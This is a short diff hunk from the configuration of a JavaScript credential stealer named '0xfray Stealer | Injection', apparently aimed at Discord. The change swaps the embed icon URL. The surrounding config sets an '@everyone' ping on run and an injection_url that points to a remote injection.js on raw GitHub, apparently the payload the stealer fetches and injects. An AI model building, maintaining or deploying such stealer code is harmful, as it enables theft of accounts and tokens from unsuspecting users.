@@ -12,7 +12,7 @@ const config = {
   ping_on_run: true, 
   ping_val: '@everyone',
   embed_name: '0xfray Stealer | Injection', 
-  embed_icon: 'https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png'.replace(/ /g, '%20'), 
+  embed_icon: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcROHxr0YedH5BvxnsA-zpM1y8Aj1szMuDa8BQ&s'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
   injection_url: 'https://raw.githubusercontent.com/QI8YOAIHGLJSHBOIQ/-OSJG-OJBIWEHGP9/refs/heads/main/injection.js', 
   /**
